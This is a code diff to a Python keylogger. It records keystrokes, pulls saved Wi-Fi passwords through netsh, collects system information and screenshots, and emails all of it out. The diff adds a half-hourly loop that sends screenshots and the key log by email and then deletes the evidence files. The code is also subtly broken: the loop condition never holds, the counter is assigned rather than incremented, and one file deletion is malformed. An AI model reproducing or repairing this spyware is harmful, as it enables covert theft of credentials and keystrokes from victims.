@@ -17,7 +17,7 @@ import PIL
 
 count = 0
 keys = []
-seconds = time.time()
+keys_pressed = 0
 email_user = ' '
 email_send = ' '
 email_password = ' '
@@ -26,6 +26,8 @@ save_path = "C:\\Users\\Public\\Roaming\\"
 system_information = os.path.join(save_path, "sysInfo.txt")
 screenshot = os.path.join(save_path, "screenshot.png")
 wifiInfo = os.path.join(save_path, "Wifi_Passswords.txt")
+key_log = os.path.join(save_path, "log.txt")
+
 
 def get_wifiInfo():
     data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8').split('\n')
@@ -96,13 +98,13 @@ def on_press(key):
     count+= 1
     print("{0} pressed".format(key))
 
-    if count >= 5:
+    if count >= 10:
         count = 0
         log_keys(keys)
         key = []
 
 def log_keys(keys):
-    with open("log.txt", "a") as f:
+    with open(key_log, "a") as f:
         for key in keys:
             k = str(key).replace("'","")
             if k.find("space") > 0:
@@ -119,6 +121,34 @@ sendEmail(wifiInfo, "wifiInfo.txt")
 get_sysInfomation()
 sendEmail(system_information, "system_informataion.txt")
 
+get_screenshot()
+sendEmail(screenshot, "screenshot.png")
+os.remove(screenshot)
 
-with Listener(on_press=on_press, on_release = on_release) as listener:
-    listener.join()
+elapsed_time = time.time()
+iterations = 0
+iterations_end = 2 #1 hour
+
+while iterations == iterations_end:
+
+
+    with Listener(on_press=on_press, on_release = on_release) as listener:
+        listener.join()
+
+    if time.time() - elapsed_time >= 1800:
+
+        get_screenshot()
+        sendEmail(screenshot, "screenshot.png")
+        os.remove(screenshot)
+        sendEmail(key_log, "log.txt")
+
+        iterations = +1
+        with open(key_log, "w") as f:
+            f.write("Log part:{}\n\n".format(iterations + 1))
+
+        elapsed_time = time.time()
+
+os.remove(key_log)
+os.remove(system_information)
+os.remove(get_wifiInfo())
+
